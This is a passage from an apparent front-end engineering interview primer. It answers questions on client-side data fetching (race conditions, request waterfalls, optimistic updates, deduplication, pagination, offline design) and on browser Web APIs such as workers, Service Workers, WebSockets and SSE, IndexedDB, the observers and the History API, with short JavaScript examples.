1. **Race condition** — if `id` changes fast, an older, slower response can resolve *after* a newer one and overwrite it. You render the wrong user.
2. **No cancellation** — the stale request keeps running.
3. **No error or loading state** — a rejected promise is swallowed; the UI hangs on `null`.
4. **No caching or dedupe** — every mount refetches; two components asking for the same `id` fire two requests.

The minimum fix uses `AbortController` and an ignore flag:

```javascript
useEffect(() => {
  const ctrl = new AbortController();
  setStatus('loading');
  fetch(`/api/users/${id}`, { signal: ctrl.signal })
    .then(r => { if (!r.ok) throw new Error(r.status); return r.json(); })
    .then(u => setUser(u) & setStatus('success'))
    .catch(e => { if (e.name !== 'AbortError') setStatus('error'); });
  return () => ctrl.abort();      // cancel on id change / unmount
}, [id]);
```

Even this lacks caching and dedupe — which is the whole argument for a server-state library.

### Q4. What is a request waterfall, and how do you fix it?

A **request waterfall** is a chain of fetches that run sequentially because each depends on (or is merely code-positioned after) the previous one — even when they could run in parallel.

```text
Waterfall (bad):
  fetch user       ├────┤
  fetch user.orgId      ├────┤        (waited for user)
  fetch org.plan             ├────┤   (waited for org)
  total: 3× round-trips

Parallel (good):
  fetch user       ├────┤
  fetch settings   ├────┤             (independent — fire together)
  total: 1× round-trip
```

Fixes, in order of preference:

- **Parallelise independent fetches** with `Promise.all` instead of `await`-ing them one at a time.
- **Prefetch** data you know you'll need before the component that needs it mounts (on hover, on route intent, at the router/loader level).
- **Move fetching up** to a route loader or server component so the server does the dependent hops close to the database instead of across the network to the browser.
- **Colocate + hoist**: don't let a child component trigger a fetch that a parent could have started earlier.

The tell in an interview: three stacked spinners appearing one after another. That's a waterfall you can usually collapse into one.

### Q5. Walk through an optimistic update, including rollback.

An optimistic update applies the *expected* result to the UI immediately, before the server confirms — so a "like" button feels instant. If the server rejects, you roll back.

```javascript
async function toggleLike(postId) {
  const previous = cache.get(postId);              // 1. snapshot for rollback
  cache.set(postId, { ...previous, liked: true }); // 2. apply optimistically
  try {
    const server = await fetch(`/api/posts/${postId}/like`, { method: 'POST' })
      .then(r => { if (!r.ok) throw new Error(); return r.json(); });
    cache.set(postId, server);                     // 3. reconcile with truth
  } catch {
    cache.set(postId, previous);                   // 4. roll back on failure
    showToast('Could not save. Try again.');
  }
}
```

Four steps that matter: **snapshot** the current value, **apply** the optimistic value, **reconcile** with the server's real response on success (the server may have set fields you didn't), and **roll back** to the snapshot on failure. The two mistakes: forgetting rollback (UI lies after an error) and forgetting reconciliation (UI drifts from server truth). Optimistic updates shine for high-frequency, low-stakes actions (likes, toggles, reordering); avoid them for anything where showing an unconfirmed result is dangerous (payment success).

### Q6. What is request deduplication and why do you need it?

Deduplication collapses multiple identical in-flight requests into a single network call. If three components mount at once and all ask for `/api/user`, you want **one** request, not three.

The mechanism: key each request by its identity (URL + params). When a request comes in, check if one with the same key is already in flight; if so, return the *same promise* to all callers.

```javascript
const inFlight = new Map();
function dedupedFetch(url) {
  if (inFlight.has(url)) return inFlight.get(url);   // reuse in-flight promise
  const p = fetch(url).then(r => r.json()).finally(() => inFlight.delete(url));
  inFlight.set(url, p);
  return p;
}
```

Why you need it: component trees fetch redundantly all the time (a list and its header both want the current user), and **SWR-style revalidation** (refetch on focus, on interval) multiplies the opportunity for duplicate calls. Dedupe is what makes "just call `useQuery('user')` everywhere you need the user" cheap — the library guarantees one request. It's the single biggest reason server-state libraries beat hand-rolled `useEffect` fetching.

### Q7. Compare pagination, infinite scroll, and cursor-based pagination.

| | Offset pagination | Infinite scroll | Cursor pagination |
|---|---|---|---|
| Fetch | `?page=2&limit=20` | `?page=2` on scroll | `?after=<cursor>` |
| UX | Numbered pages | Continuous feed | Either |
| Deep links | Yes (`?page=5`) | Hard | Yes (opaque cursor) |
| Stable under inserts | **No** | No (offset) / Yes (cursor) | **Yes** |
| Back button | Clean | Loses scroll position | Depends |

**Offset** is simplest but broken under mutation: if a row is inserted before your page while you paginate, you see a duplicate or skip a row. **Cursor** pagination fixes this — the cursor points at "the last item I saw" (e.g. an id or timestamp), so inserts elsewhere don't shift your window. **Infinite scroll** is a UX pattern layered on either offset or cursor fetching; it's great for feeds but hostile to "find item 200," to the back button, and to accessibility (keyboard users and screen readers struggle with content that never ends). A common senior answer: use **cursor** fetching under the hood, and pick infinite-scroll-vs-numbered-pages based on whether users need to *locate* items or just *browse* them.

### Q8. Why should every async view design for loading, error, AND empty states separately?

Because they're three genuinely different situations and collapsing them produces bugs:

- **Loading** — request in flight; show a skeleton or spinner (skeletons reduce CLS and feel faster).
- **Error** — request failed; show a message and a retry, and don't wipe previously-good data if you can avoid it.
- **Empty** — request *succeeded* but returned zero rows; show "No results" with guidance, **not** a spinner and **not** an error.

```text
        ┌── pending ──→ loading UI
fetch ──┤
        ├── rejected ─→ error UI (+ retry)
        └── resolved ─→ data.length ? list : empty UI
```

The classic bug is treating empty as loading: the user has no items, the array is `[]`, but the code checks `if (!data)` — `[]` is truthy, so it renders an empty list with no explanation, or worse, an infinite spinner because the "no data yet" and "no data exists" cases share a flag. Distinguishing them is also an accessibility requirement: the empty and error states need to be *announced*, not just rendered (see the Accessibility topic on live regions).

### Q9. How does `AbortController` cancel a fetch, and what does "cancel" actually mean?

`AbortController` produces a `signal` you pass into `fetch`; calling `controller.abort()` rejects the fetch promise with an `AbortError`.

```javascript
const ctrl = new AbortController();
fetch('/api/search?q=react', { signal: ctrl.signal })
  .then(r => r.json())
  .catch(e => { if (e.name === 'AbortError') return; /* real error */ });

ctrl.abort();   // reject the promise, stop processing the response
```

What "cancel" means precisely: it stops **your client** from waiting for and processing the response, and the browser may drop the connection — but **the server may still complete the work** it started. Aborting a `POST /charge` does *not* guarantee the charge didn't happen. So `AbortController` is safe for **read** cancellation (typeahead search, navigating away) but is not a transaction rollback.

Two idiomatic uses: cancel the previous request when a new one supersedes it (search-as-you-type — abort the stale query), and cancel on unmount so a resolved response doesn't try to update a gone component. The same `signal` also works with `addEventListener`, so one controller can tear down a whole cluster of subscriptions.

### Q10. Where should a given piece of state live — URL, memory, storage, or server?

Pick the home by the state's **lifetime and shareability**:

- **URL** (query params, path) — anything a user should be able to **bookmark, share, or reach with the back button**: current tab, search query, filters, page number, selected item. If refreshing the page should preserve it and a link should reproduce it, it belongs in the URL.
- **In-memory** (component state, a store) — ephemeral UI state that dies with the session: is a modal open, unsaved form input, hover state. Cheap, fast, gone on refresh.
- **Web Storage** (`localStorage` / `sessionStorage`) — client-only preferences that should survive reload but never hit the server: theme, "dismissed this banner," a draft. `sessionStorage` for per-tab, `localStorage` for persistent.
- **Server** (the database, via server state) — the source of truth: user records, orders, anything shared across devices or users.

The most common miss is under-using the **URL**. Storing the active filter in `useState` means a refresh loses it and a shared link is broken; putting it in the query string makes the view linkable, refresh-safe, and back-button-correct for free. When in doubt for anything navigational, reach for the URL first.

### Q11. You type in a search box and results flicker between old and new queries. What's happening?

A **race condition**: an older, slower request resolves *after* a newer one and overwrites the newer results. You type "re", fire a fetch; type "react", fire another; the "re" response is slow and lands last, stomping the "react" results.

```text
type "re"    → fetch A  ────────────────┤ (slow) resolves last  ✗ wins
type "react" → fetch B  ────┤ (fast) resolves first
```

Fixes, from crude to clean:

- **Abort the previous request** when a new keystroke fires (`AbortController`) — the stale response never lands.
- **Ignore-stale-response flag / request id** — tag each request; only apply the response if it's the latest one you issued.
- **Debounce** the input so you don't fire a request per keystroke in the first place (fewer racers), and use a server-state library that keys by query and handles ordering for you.

Best practice combines them: debounce the input, key the query by its text, and cancel superseded requests. The underlying lesson is that async responses arrive **out of order**, so any code that "sets state from the latest fetch" must actively enforce which response is allowed to win.

### Q12. What does a server-state library (React Query / SWR) give you that hand-rolled fetching doesn't?

It's not about React specifically — it's the bundle of **server-state concerns** you'd otherwise re-implement per component, badly:

- **Caching** keyed by query, so identical queries share data.
- **Deduplication** of concurrent identical requests into one.
- **Background revalidation** (on focus, reconnect, interval) with stale-while-revalidate.
- **Automatic loading / error / stale flags** so you don't juggle booleans.
- **Cancellation** and race-condition handling out of the box.
- **Mutation + invalidation** — after a write, mark related queries stale so lists refresh.
- **Optimistic update** helpers with rollback.

The point to make in an interview: these are *general data-synchronisation problems*, and you either solve them once in a library or re-solve them ad hoc in every `useEffect`. Naming them as a category — "server state is a caching problem, and here are the pieces" — is the senior signal; the specific library is an implementation detail (SWR, React Query, RTK Query, Apollo, or a vanilla wrapper all embody the same ideas).

### Q13. How do you invalidate or refresh data after a mutation?

After a write (create/update/delete), the cached copies of the affected data are now stale. Two strategies:

1. **Invalidate and refetch** — mark related query keys stale so they refetch. Simple and correct: the server is the source of truth.

```javascript
await fetch('/api/todos', { method: 'POST', body });
queryClient.invalidateQueries('todos');   // next read refetches fresh list
```

2. **Update the cache directly** — write the mutation's result into the cache without a refetch (optimistically, or from the server's response). Faster (no extra round-trip) but you must reproduce the server's logic client-side, which drifts.

The pragmatic default: **optimistically update** for instant feedback, then **invalidate** so the next revalidation reconciles with server truth. Pure cache-surgery-only is fragile because the server may compute derived fields (updated timestamps, denormalised counts) you can't perfectly mirror. The mistake juniors make is forgetting invalidation entirely — the POST succeeds, the list doesn't update, and the user thinks the action failed.

### Q14. What's the difference between debounce and throttle, and which fits which fetching case?

Both limit how often a function runs, but differently:

- **Debounce** — wait until the events *stop* for N ms, then fire once. Good for "act on the final value": search-as-you-type (fire when the user pauses), auto-save, resize-then-recompute.
- **Throttle** — fire at most once per N ms *during* a stream of events. Good for "act at a steady rate while it's happening": scroll-position tracking, drag, live progress.

```text
events:   x x x x x        x x x
debounce: ............⟶fire     ......⟶fire   (fires after silence)
throttle: ⟶fire..⟶fire..⟶fire   ⟶fire..⟶fire  (fires on a cadence)
```

For **data fetching**, debounce is almost always what you want on inputs — you don't care about intermediate keystrokes, only the query the user settled on, and debouncing cuts the number of requests (and races) dramatically. Throttle fits telemetry-style fetches where you want periodic updates during continuous activity. A subtle point: debounce plus request cancellation is the gold standard for typeahead — debounce reduces request *count*, cancellation ensures the surviving requests can't land out of order.

### Q15. How would you design offline-tolerant data fetching?

Layer it, from cheapest to most involved:

1. **HTTP cache** — set `Cache-Control` so `GET`s serve from disk cache when the network is flaky; free, but coarse.
2. **In-app cache with SWR** — keep last-known-good data in memory/storage and render it while offline; show a "showing cached data" indicator.
3. **Service Worker** — a network proxy (see the next topic) that intercepts fetches and serves from a programmable cache (cache-first for assets, network-first with cache fallback for data). This is what makes a PWA usable offline.
4. **IndexedDB** for large structured data and a **mutation queue** — writes made offline are stored and replayed when connectivity returns (with conflict handling).

The mental model: **reads degrade to the last cached value; writes queue and sync later.** The hard part is writes — you need optimistic UI so the user sees their change, a durable queue (IndexedDB) so it survives a reload, and a reconciliation strategy for when the replayed write conflicts with server changes (last-write-wins, merge, or prompt). For reads-only offline (a docs site), a Service Worker with a cache-first strategy is often enough; full offline-write apps are a significant undertaking.

### Q16. A list page fires one request per row to fetch each item's detail. Why is it slow and how do you fix it?

It's the **N+1 request problem** on the front end: one request for the list, then N requests (one per row) for details. On HTTP/1.1 the browser caps at ~6 connections per host, so the Nth request queues behind head-of-line blocking; even on HTTP/2 multiplexing, N round-trips of latency and N sets of headers add up, and the server takes N times the work.

```text
GET /api/items            → [1,2,3,...,50]
GET /api/items/1          ┐
GET /api/items/2          │  50 requests, throttled ~6 at a time on H1
...                       ┘
```

Fixes:

- **Batch on the server** — a single `GET /api/items?ids=1,2,3` or an endpoint that returns the list *with* details. Best fix; eliminates N+1.
- **Return richer list data** — if the list needs the detail fields, the list endpoint should include them (avoid the second fetch entirely).
- **GraphQL / BFF** — let one query resolve the whole shape server-side, close to the data.
- **Deduplicate + parallelise** if you can't batch — at least don't fetch the same id twice, and fire in parallel rather than a waterfall.
- **Lazy-fetch on demand** — only fetch a row's detail when it scrolls into view (IntersectionObserver) or is expanded, so you pay for what's seen.

The root cause is almost always an API shape mismatch — the frontend is compensating for an endpoint that returns too little. Push the fix to the API when you can.

## Web APIs & Browser Capabilities

### Summary

**What this topic covers**

The browser is a platform, and this topic is the toolbox it hands you beyond the DOM. These are the built-in Web APIs an engineer reaches for to move work off the main thread, talk to the network in different shapes, store data, observe the page, and control navigation without a full reload. The families: **networking** (`fetch`, `XMLHttpRequest`, `AbortController`); **background execution** (**Web Workers** for CPU, **Service Workers** for network/offline/push); **real-time transport** (**WebSockets** and **Server-Sent Events**); **storage** (**IndexedDB**, and its place among cookies/localStorage/Cache API); the **observer APIs** (**Intersection**, **Resize**, **Mutation**); the **History API** for SPA routing; **Web Components** (custom elements + shadow DOM); and utilities like `structuredClone` and `BroadcastChannel`. The 16 questions here are about **choosing the right API for a task** and knowing each one's constraints — no DOM in a worker, SSE is one-way, IndexedDB is async.

**Mental model**

Think of the browser as an operating system and these APIs as its system calls. The single most important axis is **the main thread**: it runs your JS, layout, and paint, and if you block it the page freezes. So the platform gives you ways to get work *off* it (Web Workers), to *intercept and cache* network traffic independently of it (Service Workers), and to *react to page changes efficiently* without polling in a hot loop (the observers). The second axis is **communication shape**: request/response (`fetch`), server-push one-way (SSE), or full-duplex (WebSocket) — you pick by how the data flows. The third is **persistence**: how much, how structured, sync or async (localStorage is a synchronous 5MB string bucket; IndexedDB is an async, large, structured database). Most of these APIs are **message-passing** across a boundary (worker ↔ page, tab ↔ tab), which means data is *copied* (structured clone), not shared — a constraint that shapes how you use them.

**Key terms**

- **Web Worker** — a background thread for CPU work; no DOM, no `window`, communicates by `postMessage`.
- **Service Worker** — a proxy sitting between the page and the network; enables offline, caching, and push; runs even when the page is closed.
- **WebSocket** — a persistent, bidirectional (full-duplex) TCP connection for real-time two-way data.
- **Server-Sent Events (SSE)** — a one-way server→client stream over HTTP; auto-reconnects; text only.
- **IndexedDB** — an asynchronous, transactional, large-capacity, structured client-side database.
- **IntersectionObserver** — fires when an element enters/leaves the viewport (lazy loading, infinite scroll).
- **ResizeObserver** — fires when an element's size changes (not just the window).
- **MutationObserver** — fires when the DOM tree changes (nodes added/removed/attributes changed).
- **History API** — `pushState`/`replaceState`/`popstate`; lets an SPA change the URL without a reload.
- **Custom elements / shadow DOM** — the two halves of Web Components: new HTML tags + encapsulated, scoped DOM/CSS.
- **`structuredClone`** — deep-copies structured data (handles Maps, Dates, ArrayBuffers) — the algorithm behind `postMessage`.
- **`BroadcastChannel`** — a pub/sub channel between same-origin tabs/workers.

**Why interviewers ask this**

This topic separates engineers who know *the browser* from engineers who only know a framework. A senior front-end dev knows that a 200ms JSON-parsing hitch belongs in a Web Worker, that offline support means a Service Worker, that a live price ticker is SSE-or-WebSocket (and which), and that lazy-loading images is `IntersectionObserver`, not a scroll listener. Interviewers ask "how would you offload this heavy computation," "how would you make this work offline," "server push vs polling," and "how does client-side routing change the URL without reloading" precisely because the answers reveal platform depth. The failure mode is reaching for a library or a hack (scroll listeners, `setInterval` polling, a bloated state store) when the platform already has the right primitive.

**Common confusions**

- "Web Workers and Service Workers are similar" — no. Web Workers offload **CPU**; Service Workers proxy the **network**. Different jobs entirely.
- "Workers can touch the DOM" — they can't. No `document`, no `window`; they talk via messages.
- "WebSockets are always better than SSE" — SSE is simpler, auto-reconnects, and rides plain HTTP; use it when you only need server→client.
- "localStorage is fine for lots of data" — it's synchronous (blocks the main thread) and ~5MB; use IndexedDB for large/structured data.
- "Shadow DOM is the same as the virtual DOM" — unrelated. Shadow DOM is style/markup **encapsulation**; the virtual DOM is a framework diffing technique.
- "`postMessage` shares the object" — it **copies** it (structured clone); mutating one side doesn't affect the other (unless you transfer an ArrayBuffer).

**What follows from this topic**

These APIs underpin the rest of the primer. `fetch` + `AbortController` power the State & Data Fetching topic. Service Workers are the programmable layer of the Browser Caching topic and the backbone of offline PWAs. IntersectionObserver drives the lazy-loading in Web Performance (loading). Moving work off the main thread with Web Workers connects to the Event Loop and Runtime Performance topics and parallels the Concurrency primer. The History API is what makes CSR routing possible in the Rendering Strategies topic. And Web Components' shadow DOM is the platform's answer to the style-encapsulation problem that CSS-in-JS solves in frameworks.

### Q1. When would you use a Web Worker, and what can't it do?

Use a Web Worker to run **CPU-heavy JavaScript off the main thread** so the UI stays responsive: parsing a large JSON/CSV file, image processing, cryptography, running a client-side ML model, complex data transforms, syntax highlighting. Anything that would otherwise produce a "long task" and jank the page.

```javascript
// main.js
const worker = new Worker('parse.js');
worker.postMessage(bigCsvString);
worker.onmessage = e => render(e.data);   // gets the parsed result back

// parse.js — runs on its own thread
onmessage = e => {
  const rows = parseCsv(e.data);           // heavy work, no jank on main thread
  postMessage(rows);
};
```

What it **can't** do: touch the **DOM** (no `document`, no `window`), and it doesn't share memory with the page — data is **copied** via structured clone across `postMessage` (unless you *transfer* an ArrayBuffer, which moves ownership with zero copy). So the pattern is: send input in, do the number-crunching, send results out, and let the main thread do the DOM update. The cost is the serialization overhead and the ceremony of message-passing, so workers pay off for genuinely heavy work, not trivial functions.

### Q2. What is a Service Worker and how does it differ from a Web Worker?

A **Service Worker** is a script that sits **between your page and the network** as a programmable proxy. It can intercept every `fetch`, serve responses from a cache, work offline, receive push notifications, and run in the background even when no page is open.

The difference from a Web Worker is the *job*, not the threading:

| | Web Worker | Service Worker |
|---|---|---|
| Purpose | Offload CPU | Proxy network / offline / push |
| Lifetime | Tied to the page | Independent; wakes on events |
| DOM access | No | No |
| Scope | One page | An origin/scope, all its pages |
| Key event | `onmessage` | `fetch`, `install`, `activate`, `push` |

```javascript
// sw.js — intercept fetches, cache-first
self.addEventListener('fetch', e => {
  e.respondWith(
    caches.match(e.request).then(cached => cached || fetch(e.request))
  );
});
```

Service Workers are what make **PWAs** installable and offline-capable, and they're the programmable layer of the browser cache. Two gotchas: they require **HTTPS** (they can rewrite responses, so the browser demands a secure origin), and their **lifecycle** (install → activate → the "waiting" state on update) trips people up — a new SW won't take control of open pages until they're reloaded unless you call `skipWaiting`/`clients.claim`.

### Q3. WebSockets vs Server-Sent Events vs polling — when do you use each?

By **directionality and complexity**:

| | Polling | SSE | WebSocket |
|---|---|---|---|
| Direction | Client pulls | Server → client (one-way) | Bidirectional (full-duplex) |
| Transport | Repeated HTTP | One long-lived HTTP | Upgraded TCP |
| Reconnect | Manual | **Automatic** (built in) | Manual (you write it) |
| Data | Any | Text only | Text + binary |
| Complexity | Lowest | Low | Higher (stateful server) |

- **Polling** (`fetch` on an interval): simplest, fine for data that changes slowly and where a few seconds of staleness is OK (a dashboard refreshing every 30s). Long-polling is a variant that holds the request open.
- **SSE**: the right default for **server→client only** streams — live scores, notifications, a progress feed, log tailing. It rides plain HTTP/2, auto-reconnects, and is trivial: `new EventSource('/api/stream')`.
- **WebSocket**: when you need **two-way, low-latency** communication — chat, collaborative editing, multiplayer, live trading. It's a persistent connection, which means stateful servers, scaling considerations, and you handle reconnection yourself.

The senior answer: don't default to WebSockets. If data only flows *down*, SSE is simpler and more robust. Reach for WebSockets when the client also needs to push frequently and latency matters.

### Q4. Compare the client-side storage options and when to use each.

| | Cookies | localStorage | sessionStorage | IndexedDB | Cache API |
|---|---|---|---|---|---|
| Capacity | ~4KB | ~5–10MB | ~5–10MB | Large (GBs) | Large |
| API | string | sync, string | sync, string | **async**, structured | async, Request/Response |
| Lifetime | Expiry/session | Persistent | Per-tab | Persistent | Persistent |
| Sent to server | **Every request** | No | No | No | No |
| Use for | Auth/session id | Small prefs, tokens | Per-tab draft | Large structured data | HTTP responses (SW) |

- **Cookies** — the only storage **automatically sent to the server**; use for session ids / auth. Small and comes with `HttpOnly`/`SameSite` security flags (see the Cookies topic).
- **localStorage** — synchronous, string-only, ~5MB, same-origin, persistent. Good for a theme or a feature flag; **bad** for large data (it blocks the main thread) or anything sensitive (XSS-readable).
- **sessionStorage** — same as localStorage but scoped to the tab and cleared when it closes.
- **IndexedDB** — asynchronous, transactional, large-capacity, stores structured objects (not just strings). The right choice for **lots of data**: offline records, cached API data, a mutation queue.
- **Cache API** — stores `Request`/`Response` pairs, used by Service Workers for offline asset/data caching.

Rule of thumb: session id → cookie; small pref → localStorage; big structured/offline data → IndexedDB; cached network responses → Cache API.

### Q5. Why is IndexedDB async while localStorage is sync, and when does it matter?

`localStorage` is **synchronous**: `localStorage.getItem('x')` blocks the main thread until it returns. That's fine for a tiny read, but reading/writing a lot of data — or doing it in a hot path — **stalls rendering and input**, causing jank. It's also string-only, so you `JSON.stringify`/`parse`, which adds CPU on the main thread.

**IndexedDB is asynchronous** by design: operations return via events/promises without blocking, and it stores **structured objects** directly (including Blobs, ArrayBuffers) in a transactional database. That's what lets it hold gigabytes and serve an offline app without freezing the UI.

```javascript
// localStorage — blocks the main thread
const prefs = JSON.parse(localStorage.getItem('prefs'));   // sync

// IndexedDB — non-blocking, structured
const db = await openDB('app');
const user = await db.get('users', userId);                // async, no jank
```

It matters the moment your data is **large or frequently accessed**. Storing a 3MB cache in localStorage will visibly hitch the page; the same in IndexedDB won't. The tradeoff is IndexedDB's clunky native API (which is why wrappers like `idb` exist) — but the async, structured, large-capacity design is exactly right for serious client-side storage.

### Q6. What does IntersectionObserver do, and why is it better than a scroll listener?

`IntersectionObserver` asynchronously notifies you when a target element **enters or leaves the viewport** (or an ancestor scroll container), without you polling scroll position.

```javascript
const io = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if (entry.isIntersecting) loadImage(entry.target);  // it's visible now
  });
});
document.querySelectorAll('img[data-src]').forEach(img => io.observe(img));
```

Why it beats a `scroll` listener:

- **Performance** — a scroll handler fires *constantly* during scroll, and if it reads layout (`getBoundingClientRect`) it forces reflow every time → jank. IntersectionObserver runs **off the main thread**, batched, only firing when intersection actually changes.
- **Correctness** — it handles nested scroll containers, thresholds ("50% visible"), and root margins ("300px before it enters") declaratively.

Use it for **lazy-loading** images/components, **infinite scroll** (observe a sentinel at the list's end), impression tracking (did the ad get seen), and triggering animations on scroll-into-view. The old scroll-listener approach is the textbook example of layout thrashing (see the Runtime Performance topic); IntersectionObserver is the platform's fix.

### Q7. What's the difference between ResizeObserver and MutationObserver?

Different things being observed:

- **ResizeObserver** — fires when an **element's size** changes, for any reason (window resize, content change, flex/grid reflow, a sibling growing). Crucially, it watches the *element*, not just the window — so a component can respond to *its own* box size (container queries in JS, responsive charts).

```javascript
new ResizeObserver(entries => {
  for (const e of entries) chart.resize(e.contentRect.width);
}).observe(chartContainer);
```

- **MutationObserver** — fires when the **DOM tree** changes: nodes added/removed, attributes changed, text edited. Used to react to DOM you don't control (a third-party widget injecting markup), to detect when an element appears, or to sync something to DOM edits.

```javascript
new MutationObserver(mutations => { /* nodes added/removed */ })
  .observe(container, { childList: true, subtree: true, attributes: true });
```

Both replaced worse patterns: ResizeObserver replaces `window.resize` + manual measurement (which missed element-only resizes and thrashed layout), and MutationObserver replaced the deprecated, synchronous, catastrophically slow Mutation *Events*. Both deliver changes **asynchronously in batches**, which is what keeps them cheap. Rule of thumb: size → ResizeObserver, structure → MutationObserver, visibility → IntersectionObserver.

### Q8. How does client-side routing change the URL without a full page reload?

Via the **History API** — `pushState` and `replaceState` change the URL bar and add a history entry **without triggering a navigation/reload**, and `popstate` fires when the user hits back/forward.

```javascript
// Navigate without reloading
history.pushState({ page: 'about' }, '', '/about');
renderRoute('/about');                       // you render the new view yourself

// Handle back/forward
window.addEventListener('popstate', e => {
  renderRoute(location.pathname);            // re-render for the URL we landed on
});
```

The flow in an SPA router: intercept link clicks (`preventDefault`), call `pushState` to update the URL, and render the matching component — no server round-trip. On back/forward, `popstate` tells you the URL changed so you render the right view. `replaceState` is for updates that *shouldn't* add a history entry (e.g. syncing a filter into the query string).

Two things to get right: the **server must fall back to `index.html`** for any deep path (`/about` typed directly must serve the app, or you get a 404 — this is the SPA rewrite rule), and you must **manage focus and scroll** on route change for accessibility (see the Accessibility topic). The newer **Navigation API** improves on all this, but `pushState`/`popstate` is the foundation every SPA router is built on.

### Q9. What are Web Components, and what problem does shadow DOM solve?

**Web Components** are the browser-native way to build reusable, framework-agnostic components, made of two main pieces:

- **Custom elements** — define your own HTML tags with behaviour: `class MyCard extends HTMLElement { connectedCallback() {...} }` then `customElements.define('my-card', MyCard)`, used as `<my-card>`.
- **Shadow DOM** — an **encapsulated** DOM subtree attached to an element, with its **styles scoped inside**. CSS in the shadow tree doesn't leak out, and page CSS doesn't leak in.

```javascript
class MyCard extends HTMLElement {
  constructor() {
    super();
    const shadow = this.attachShadow({ mode: 'open' });
    shadow.innerHTML = `<style>p { color: blue }</style><p><slot></slot></p>`;
  }
}
customElements.define('my-card', MyCard);
```

The problem shadow DOM solves is **style and DOM encapsulation** — the same problem CSS-in-JS, CSS Modules, and BEM naming try to solve with conventions. With shadow DOM the browser *enforces* it: a component's internal `<p>` styling can't be clobbered by global CSS, and its internals are hidden from `document.querySelector`. `<slot>` lets consumers project content in. Web Components' appeal is **framework independence** — a `<my-card>` works in React, Vue, or plain HTML — which is why design systems ship them; the tradeoffs are clunkier ergonomics and SSR/hydration friction compared to framework components.

### Q10. How would you offload a 500ms JSON parse that's freezing the UI?

A 500ms synchronous parse is a **long task** that blocks the main thread — no rendering, no input response, frozen scroll for half a second. Move it off the main thread.

**Web Worker** is the right tool:

```javascript
// main thread stays free
const worker = new Worker('parser.js');
worker.postMessage(rawText);
worker.onmessage = e => updateUI(e.data);   // main thread only does the cheap DOM part

// parser.js
onmessage = e => postMessage(JSON.parse(e.data));   // heavy parse off-thread
```

Caveats and alternatives:

- The data crosses the boundary by **structured clone**, so very large payloads pay a serialization cost — sometimes enough to erode the win. Measure. Transferring an ArrayBuffer (zero-copy transfer) helps for binary.
- If you can't use a worker, **chunk the work** and yield to the event loop between chunks (`await scheduler.yield()` or `setTimeout(0)` between batches) so the browser can paint and handle input between slices — this keeps the page responsive even though total time is unchanged.
- Best of all: **don't parse 500ms of JSON on the client** — paginate the API, stream it, or move the transform to the server.

The principle (from the Event Loop / Runtime Performance topics): never run a long synchronous task on the main thread; offload it or break it up.

### Q11. What is `structuredClone` and why does it matter for `postMessage`?

`structuredClone(value)` deep-copies a value using the **structured clone algorithm** — and unlike `JSON.parse(JSON.stringify(x))`, it correctly handles `Map`, `Set`, `Date`, `RegExp`, `ArrayBuffer`, typed arrays, and **circular references**, none of which survive a JSON round-trip.

```javascript
const original = { when: new Date(), tags: new Set(['a']), self: null };
original.self = original;                  // circular
const copy = structuredClone(original);    // works — JSON would throw / lose types
```

It matters for `postMessage` because that's the *same algorithm* the browser uses to move data across boundaries — worker ↔ page, tab ↔ tab (`BroadcastChannel`), `window.postMessage`. Understanding this explains the key constraint: data passed to a worker is **copied, not shared**, so:

- Mutating the object on one side doesn't affect the other.
- Functions, DOM nodes, and class instances (their methods) **can't** be cloned — you'll get a `DataCloneError`.
- Large objects cost real time to clone on both sides, which is the hidden tax of worker communication.

The escape hatch is **transferables**: `worker.postMessage(buf, [buf])` *transfers* an ArrayBuffer's ownership (zero-copy) instead of cloning it — fast, but the sender loses access. `structuredClone` as a standalone function is also just a handy way to deep-copy state without a library.

### Q12. How would you sync state across multiple open tabs of your app?

Several same-origin mechanisms, best-to-worst for most cases:

- **`BroadcastChannel`** — a purpose-built pub/sub channel between same-origin tabs/workers. Cleanest.

```javascript
const bus = new BroadcastChannel('app');
bus.postMessage({ type: 'logout' });       // other tabs receive this
bus.onmessage = e => { if (e.data.type === 'logout') redirectToLogin(); };
```

- **`storage` event** — writing to `localStorage` fires a `storage` event **in other tabs** (not the writer). The classic pre-BroadcastChannel trick; still useful because it doubles as persistence.

```javascript
window.addEventListener('storage', e => {
  if (e.key === 'auth' && !e.newValue) redirectToLogin();  // logged out elsewhere
});
```

- **Shared Worker** — one worker instance shared by all tabs, acting as a coordination hub (a single WebSocket shared across tabs).
- **Service Worker** — can broadcast to all controlled clients.

The canonical use cases: propagate **logout/login** to every tab, sync a **theme** change, keep a cart consistent, or elect one tab to own a WebSocket. `BroadcastChannel` is the modern default; the `storage` event is the widely-supported fallback that also persists the value. Remember the data crosses via structured clone, so pass plain serializable messages.

### Q13. `fetch` vs `XMLHttpRequest` — what's the difference and when would you still use XHR?

`fetch` is the modern promise-based networking API; `XMLHttpRequest` (XHR) is the older event-based one. `fetch` is cleaner, streams responses, integrates with `AbortController`, Service Workers, and async/await.

```javascript
const res = await fetch('/api/data', { signal: ctrl.signal });
if (!res.ok) throw new Error(res.status);   // note: fetch does NOT reject on 4xx/5xx
const data = await res.json();
```

Two `fetch` gotchas to name in an interview: it **only rejects on network failure**, not on HTTP error status — a 404 or 500 is a *resolved* response with `res.ok === false`, so you must check `res.ok` yourself; and by default it **doesn't send cookies cross-origin** unless you set `credentials: 'include'`.

You'd still reach for **XHR** in a few cases: **upload progress events** (`fetch` request bodies historically couldn't report upload progress; XHR's `upload.onprogress` can), synchronous requests in legacy code (don't), and older-browser support without a polyfill. For everything else, `fetch` wins — and pairing it with `AbortController` (cancellation) and proper `res.ok` checks is the expected baseline. Newer streaming/`Request` APIs are closing the last XHR gaps.

### Q14. How do you implement infinite scroll correctly with browser APIs?

Use an **IntersectionObserver on a sentinel** element at the end of the list — when it scrolls into view, fetch the next page.

```javascript
const sentinel = document.querySelector('#load-more');
const io = new IntersectionObserver(async ([entry]) => {
  if (!entry.isIntersecting || loading) return;
  loading = true;
  const next = await fetchPage(cursor);     // cursor pagination, not offset
  appendRows(next.items);
  cursor = next.nextCursor;
  if (!next.nextCursor) io.disconnect();    // no more pages
  loading = false;
}, { rootMargin: '300px' });                // prefetch before it's fully visible
io.observe(sentinel);
```

The pieces that make it *correct*:

- **IntersectionObserver, not a scroll listener** — off-thread, no layout thrash.
- **`rootMargin`** to fetch *ahead* of the viewport so content is ready before the user reaches it.
- **A loading guard** so a fast scroll doesn't fire duplicate fetches.
- **Cursor pagination** so inserts/deletes don't duplicate or skip rows (see the Data Fetching topic).
- **List virtualization** for very long lists so the DOM doesn't grow unbounded and tank memory/scroll perf.

